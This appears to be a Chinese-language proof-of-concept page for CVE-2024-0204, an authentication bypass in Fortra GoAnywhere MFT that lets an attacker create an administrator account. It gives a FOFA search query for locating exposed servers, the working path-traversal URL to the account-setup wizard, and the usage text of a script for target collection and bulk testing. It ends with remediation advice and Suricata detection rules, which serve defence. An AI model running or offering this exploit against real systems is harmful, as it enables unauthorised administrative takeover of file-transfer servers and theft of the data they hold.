### 产品简介  
Fortra GoAnywhere MFT是美国Fortra公司的一种安全的文件传输解决方案。  

### 漏洞概述  
Fortra GoAnywhere MFT 7.4.1之前版本存在安全漏洞。攻击者利用该漏洞绕过身份验证，从而通过管理门户创建管理员用户。  

### 指纹识别  
fofa: "GoAnywhere" && icon_hash="1484947000"  

### 漏洞利用  
```
/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml
```
![Image text](https://github.com/YUUKI4O4/POC/blob/main/CVE-2024-0204/1.png)

### 测试和利用脚本  
```
python3 CVE-2024-0204.py -h
usage: CVE-2024-0204.py [-h] [-t] [-r FILE] [-u URL]

### GoAnywhere MFT authentication bypass vulnerability (CVE-2024-0204). ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python CVE-2024-0204.py -r ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python CVE-2024-0204.py -u http://xxx.xxx.xxx
```

### 修复建议  
1、请联系厂商进行修复。  
2、如非必要，禁止公网访问该系统。  
3、设置白名单访问。  

### Suricata rules  
```
alert http any any -> any any (msg:"GoAnywhere MFT authentication bypass vulnerability (CVE-2024-0204)"; flow:established,to_server; flowbits:set,GoAnywhere; content:"get";http_method;nocase; content:"/goanywhere/images/..\;/wizard/InitialAccountSetup.xhtml";http_uri;fast_pattern;nocase; reference:cve,CVE-2024-0204; classtype:CVE; metadata:created_at 2024-01-29,updated_at 2024-01-29,creater:YUUKI4O4; sid:25; rev:1;)
alert http any any -> any any (msg:"GoAnywhere MFT authentication bypass vulnerability (CVE-2024-0204)"; flow:established,from_server; flowbits:isset,GoAnywhere; content:"200";http_stat_code; content:"username";http_server_body;nocase; content:"password";http_server_body;nocase; reference:url,https://github.com/cbeek-r7/CVE-2024-0204/blob/main/CVE-2024-0204-scan.py; reference:cve,CVE-2024-0204; classtype:CVE; metadata:created_at 2024-01-29,updated_at 2024-01-29,creater:YUUKI4O4; sid:26; rev:1;)
```
